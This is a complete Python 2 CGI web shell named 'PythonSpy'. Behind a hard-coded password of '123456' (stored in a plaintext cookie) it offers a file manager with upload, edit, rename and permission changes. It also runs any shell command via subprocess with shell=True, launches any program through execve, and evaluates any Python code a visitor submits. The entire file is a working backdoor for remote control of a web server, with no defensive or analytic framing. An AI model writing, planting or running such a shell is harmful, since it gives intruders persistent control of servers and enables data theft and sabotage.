#!C:/Python26/python.exe
# -*- coding: utf-8 -*-
# enable debugging
import cgi
import os
import sys
import time
import re
import socket
import stat
import StringIO
import subprocess
import time
import itertools

from os import environ
form = cgi.FieldStorage()

# ===================== 程序配置 =====================
admin={}
# 是否需要密码验证, true 为需要验证, false 为直接进入.下面选项则无效
admin['check'] = True
admin['pass'] = '123456'

# 如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
# cookie 前缀
admin['cookiepre'] = '';
# cookie 作用域
admin['cookiedomain'] = '';
# cookie 作用路径
admin['cookiepath'] = '/';
# cookie 有效期
admin['cookielife'] = 86400;

# ===================== 配置结束 =====================

self = os.path.basename(__file__)
timestamp = time.time()

def getcookie(key):
    if environ.has_key('HTTP_COOKIE'):
       for cookie in environ['HTTP_COOKIE'].split(';'):
            k , v = cookie.split('=')
            if key == k:
                return v
    return ""


def getvalue(key):
    if form.has_key(key):
        return form.getvalue(key)
    return ""

def tryExcept(fun):
    def wrapper(args):
        try:
            fun(args)
        except:
            pass
    return wrapper

def handler():
    action = getvalue("action")
    if action == "" or action == "file":
        do_file()
    elif action == "shell":
        do_shell()
    elif action == "env":
        do_env()
    elif action == "eval":
        do_eval()
bgc = 0
def bg():
    global bgc
    bgc += 1
    return 'alt1' if bgc%2 == 0 else 'alt2'

def loginpage():
    loginHtml = """
    <style type="text/css">
    input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
    </style>
    <form method="POST" action="">
    <span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
    <input type="hidden" name="doing" value="login">
    <input type="submit" value="Login">
    </form>
    """
    print loginHtml

def index():
    addr,host = "",""
    if environ.has_key('REMOTE_ADDR'):
        addr = environ['REMOTE_ADDR']
    if environ.has_key('REMOTE_HOST'):
        host = environ['REMOTE_HOST']
    else:
        host = socket.gethostbyaddr(addr)[0]
    html = """
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=gbk">
    <title>PythonSpy</title>
    <style type="text/css">
        body,td{font: 12px Arial,Tahoma;line-height: 16px;}
        .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
        .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
        .bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
        a {color: #00f;text-decoration:underline;}
        a:hover{color: #f00;text-decoration:none;}
        .alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
        .alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
        .focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
        .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
        .head td span{font-weight:normal;}
        form{margin:0;padding:0;}
        h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
        ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
        u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
    </style>
    <script type="text/javascript">
        function CheckAll(form) {
            for(var i=0;i<form.elements.length;i++) {
                var e = form.elements[i];
                if (e.name != 'chkall')
                    e.checked = form.chkall.checked;
            }
        }

        function $(id) {
            return document.getElementById(id);
        }

        function goaction(act){
            $('goaction').action.value=act;
            $('goaction').submit();
        }
    </script>
    </head>
    <body style="margin:0;table-layout:fixed; word-break:break-all">
    <table width="100%%" border="0" cellpadding="0" cellspacing="0">
        <tr class="head">
            <td><span style="float:right;"><a href="http://blog.csdn.net/yueguanghaidao" target="_blank"> Author: SkyCrab</a></span>%s(%s)
            </td>
        </tr>
        <tr class="alt1">
            <td>
                <a href="javascript:goaction('file');">File Manager</a> |
                <a href="javascript:goaction('shell');">Execute Command</a> |
                <a href="javascript:goaction('env');">System Variable</a> |
                <a href="javascript:goaction('eval');">Eval Python Code</a>
            </td>
        </tr>
    </table>
    <form name="goaction" id="goaction" action="" method="post" >
    <input id="action" type="hidden" name="action" value="" />
    </form>
    """ % (addr,host)
    print html
    handler()

def getPerms(path):
    user = {}
    group = {}
    other = {}
    mode = os.stat(path)[stat.ST_MODE]
    perm = oct(mode)[-4:]
    type = ""

    if stat.S_ISDIR(mode):
        type = 'd'
    elif stat.S_ISLNK(mode):
        type = 'l'
    elif stat.S_ISCHR(mode):
        type = 'c'
    elif stat.S_ISBLK(mode):
        type = 'b'
    elif stat.S_ISREG(mode):
        type = '-'
    elif stat.S_ISFIFO(mode):
        type = 'p'
    elif stat.S_ISSOCK(mode):
        type = 's'
    else:
        type = '?'

    user['read'] = 'r' if (mode & 00400) else '-'
    user['write'] = 'w' if (mode & 00200) else '-'
    user['execute'] = 'x' if (mode & 00100) else '-'
    group['read'] = 'r' if (mode & 00040) else '-'
    group['write'] = 'w' if (mode & 00020) else '-'
    group['execute'] = 'x' if (mode & 00010) else '-'
    other['read'] = 'r' if (mode & 00004) else '-'
    other['write'] = 'w' if (mode & 00002) else '-'
    other['execute'] = 'x' if (mode & 00001) else '-'

    return perm,type+user['read']+user['write']+user['execute']+group['read']+group['write']+group['execute']+other['read']+other['write']+other['execute']



def do_file():
    current_dir = getvalue("dir") or os.getcwd()
    parent_dir = os.path.dirname(current_dir)
    perm,mode = getPerms(current_dir)

    forms = """
    <form name="createdir" id="createdir" action="" method="post" >
    <input id="newdirname" type="hidden" name="newdirname" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="fileperm" id="fileperm" action="" method="post" >
    <input id="newperm" type="hidden" name="newperm" value="" />
    <input id="pfile" type="hidden" name="pfile" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="copyfile" id="copyfile" action="" method="post" >
    <input id="sname" type="hidden" name="sname" value="" />
    <input id="tofile" type="hidden" name="tofile" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="rename" id="rename" action="" method="post" >
    <input id="oldname" type="hidden" name="oldname" value="" />
    <input id="newfilename" type="hidden" name="newfilename" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="fileopform" id="fileopform" action="" method="post" >
    <input id="action" type="hidden" name="action" value="" />
    <input id="opfile" type="hidden" name="opfile" value="" />
    <input id="dir" type="hidden" name="dir" value="" />
    </form>
    """ % tuple((current_dir+'/' for x in range(4)))

    godir="""
    <table width="100%%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
      <form action="" method="post" id="godir" name="godir">
      <tr>
        <td nowrap>Current Directory (%s, %s)</td>
        <td width="100%%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="%s" type="text" style="width:100%%;margin:0 8px;"></td>
        <td nowrap><input class="bt" value="GO" type="submit"></td>
      </tr>
      </form>
    </table>
    <script type="text/javascript">
    function createdir(){
        var newdirname;
        newdirname = prompt('Please input the directory name:', '');
        if (!newdirname) return;
        $('createdir').newdirname.value=newdirname;
        $('createdir').submit();
    }
    function fileperm(pfile){
        var newperm;
        newperm = prompt('Current file:'+pfile+'Please input new attribute:', '');
        if (!newperm) return;
        $('fileperm').newperm.value=newperm;
        $('fileperm').pfile.value=pfile;
        $('fileperm').submit();
    }
    function copyfile(sname){
        var tofile;
        tofile = prompt('Original file:'+sname+'Please input object file (fullpath):', '');
        if (!tofile) return;
        $('copyfile').tofile.value=tofile;
        $('copyfile').sname.value=sname;
        $('copyfile').submit();
    }
    function rename(oldname){
        var newfilename;
        newfilename = prompt('Former file name:'+oldname+'Please input new filename:', '');
        if (!newfilename) return;
        $('rename').newfilename.value=newfilename;
        $('rename').oldname.value=oldname;
        $('rename').submit();
    }
    function dofile(doing,thefile,m){
        if (m && !confirm(m)) {
            return;
        }
        $('filelist').doing.value=doing;
        if (thefile){
            $('filelist').thefile.value=thefile;
        }
        $('filelist').submit();
    }
    function createfile(nowpath){
        var filename;
        filename = prompt('Please input the file name:', '');
        if (!filename) return;
        opfile('editfile',nowpath + filename,nowpath);
    }
    function opfile(action,opfile,dir){
        $('fileopform').action.value=action;
        $('fileopform').opfile.value=opfile;
        $('fileopform').dir.value=dir;
        $('fileopform').submit();
    }
    function godir(dir,view_writable){
        if (view_writable) {
            $('godir').view_writable.value=1;
        }
        $('godir').dir.value=dir;
        $('godir').submit();
    }
    </script>
    """ % (perm,mode,current_dir)

    manage = """
    <table width="100%%" border="0" cellpadding="4" cellspacing="0">
    <form action="%s" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">
    <div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="./" type="hidden" /><input name="dir" value="./" type="hidden" /></div>
    <a href="javascript:createdir();">Create Directory</a> |
    <a href="javascript:createfile('%s');">Create File</a>
    </td></tr></form>
    <tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%%">Last modified</td><td width="10%%">Size</td><td width="20%%">Chmod / Perms</td><td width="22%%">Action</td></tr>
    <tr class=alt1>
    <td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir('%s');">Parent Directory</a></td>
    </tr>

    <tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>

    """ % (self,current_dir,parent_dir)

    dir_action = """
    <a href="javascript:dofile('deldir','%s','Are you sure will delete test? \n\nIf non-empty directory, will be delete all the files.')">Del
    </a>|
    <a href="javascript:rename('%s');">Rename</a>
    """
    file_action = """
    <a href="javascript:dofile('downfile','%s');">Down</a> |
    <a href="javascript:copyfile('%s');">Copy</a> |
    <a href="javascript:opfile('editfile','%s','%s');">Edit</a> |
    <a href="javascript:rename('%s');">Rename</a> |
    <a href="javascript:opfile('newtime','%s','%s');">Time</a>
    """

    lists = """
    <tr class="%s" onmouseover="this.className='focus';" onmouseout="this.className='%s';">
    <td>&nbsp;</td>
    <td><a href="#" target="#">%s</a></td>
    <td nowrap>%s</td>
    <td nowrap>%s</td>
    <td nowrap>
    <a href="javascript:fileperm('%s');">%s</a> /
    <a href="javascript:fileperm('%s');">%s</a>
    </td>
    <td nowrap>
    %s
    </td></tr>
    """
    print forms+godir+manage


    def getlist():
        files = []
        dirs = []
        result = ""
        dirlists = os.listdir(os.getcwd())
        dirlists.sort()
        for f in dirlists:
            abspath = "%s%s%s" %(os.getcwd(),os.sep,f)
            dirs.append(abspath) if os.path.isdir(abspath) else files.append(abspath)

        for f in itertools.chain(dirs,files):
            fstat = os.stat(f)
            modified = time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(fstat[stat.ST_MTIME]))
            mode , perm = getPerms(f)
            if os.path.isfile(f):
                size = fstat[stat.ST_SIZE]
                action = file_action % tuple([f for x in range(3)]+[os.path.dirname(f)]+[f for x in range(2)]+[os.path.dirname(f)])
            else:
                size = '-'
                action = dir_action %(f,f)
            res = lists % (bg(),bg(),f,modified,size,f,mode,f,perm,action)
            result += res
        return result

    print getlist()


def do_shell():
    log = "/c net start > %s%slog.txt" %(os.getcwd(),os.sep)
    if sys.platform == "win32":
        path ,args ,com = "c:\windows\system32\cmd.exe" ,log ,"ipconfig"
    elif sys.platform == "linux2":
        path ,args ,com = "/bin/bash" ,"--help" ,"ifconfig"
    else:
        path ,args ,com = "" ,"" ,""

    shell_cmd = getvalue("command").strip()
    shell_pro = getvalue("program").strip()
    is_cmd = True if shell_cmd !="" else False
    is_pro = True if shell_pro !="" else False

    program = shell_pro or path
    parameter = getvalue("parameter").strip() or args
    command =  shell_cmd or com

    result = ""
    if is_cmd:
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        result = "".join(p.stdout.readlines())

    shell = """
    <table width="100%%" border="0" cellpadding="15" cellspacing="0"><tr><td>
    <form name="form1" id="form1" action="" method="post" >
    <h2>Execute Program &raquo;</h2>
    <input id="action" type="hidden" name="action" value="shell" />
    <p>Program<br /><input class="input" name="program" id="program" value="%s" type="text" size="100"  /></p>
    <p>
    Parameter<br /><input class="input" name="parameter" id="parameter" value="%s" type="text" size="100"  />
    <input class="bt" name="submit" id="submit" value="Execute" type="submit" size="100"  />
    </p>
    </form>
    <form name="form1" id="form1" action="" method="post" >
    <h2>Execute Command &raquo;</h2>
    <input id="action" type="hidden" name="action" value="shell" />
    <p>Command<br /><input class="input" name="command" id="command" value="%s" type="text" size="100"  />
    <input class="bt" name="submit" id="submit" value="Execute" type="submit" size="100"  /></p>
    </form>
    <pre> %s </pre>
    </td></tr>
    </table>
    """ % (program,parameter,command,result)
    print shell

    if is_pro:
        os.execve(program, parameter.split(), os.environ)

def do_env():
    def os():
        if sys.platform.startswith('l'):
            return "Linux"
        elif sys.platform.startswith('w'):
            return "Windows"
        elif sys.platform.startswith('d'):
            return "Mac"
        elif sys.platform.startswith('o'):
            return "OS"
        else:
            return "Unknown"

    server ={}
    python ={}
    server['Server Time'] = time.strftime("%Y-%m-%d %H:%M:%S",time.localtime())
    server['Server Domain'] = getvalue("SERVER_NAME")
    server['Server IP'] = socket.gethostbyname(server['Server Domain']) or "Unknown"
    server['Server OS'] = os()
    server['Server Software'] = getvalue("SERVER_SOFTWARE") or "Unknown"
    server['Cgi Path'] = getvalue("PATH_INFO") or "Unknown"

    serverInfo = ""
    pythonInfo = ""
    for k ,v in server.items():
        serverInfo += "<li><u>%s:</u>      %s</li>" % (k, v)

    for k ,v in python.items():
        pythonInfo += "<li><u>%s:</u>      %s</li>" % (k, v)

    env = """
    <table width="100%%" border="0" cellpadding="15" cellspacing="0"><tr><td>
    <h2>Server &raquo;</h2>
    <ul class="info">
    %s
    </ul>
    <h2>Python &raquo;</h2>
    <ul class="info">
    %s
    <h2>waitting for you to add!!!</h2>
    </ul>
    </tr></td>
    </table>
    """ %(serverInfo,pythonInfo)
    print env

def do_eval():
    code = getvalue("pythoncode")
    tmp = open("temp.py","w")
    tmp.write(code)
    tmp.close()
    file=StringIO.StringIO()
    if code != "":
        stdout=sys.stdout
        sys.stdout=file
        try:
            execfile("temp.py")
        except Exception,e:
            file.write(str(e))
        sys.stdout=stdout
    os.remove("temp.py")

    eval = """
    <table width="100%%" border="0" cellpadding="15" cellspacing="0"><tr><td>
    <form name="form1" id="form1" action="" method="post" >
    <h1> <pre>%s</pre> </h1>
    <h2>Eval Python Code &raquo;</h2>
    <input id="action" type="hidden" name="action" value="eval" />
    <p>Python Code<br /><textarea class="area" id="phpcode" name="pythoncode" cols="100" rows="15" >%s</textarea></p>
    <p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
    </form>
    </td></tr></table>
    """ % (file.getvalue(),code)
    print eval


def login():
    if admin["check"]:
        if getvalue("doing") == "login":
            if admin["pass"] == getvalue("password"):
                print "Set-Cookie:Pyspypass=%s" % admin["pass"]
                #print "Set-Cookie:Expires=Tuesday, 31-Dec-2014 23:12:40 GMT"
                print "Content-type:text/html"
                print
                index()
                return
        if getcookie('Pyspypass') != admin['pass']:
            print "Content-type:text/html"
            print
            loginpage()
        else:
            print "Content-type:text/html"
            print
            index()


if __name__ == '__main__':
    login()

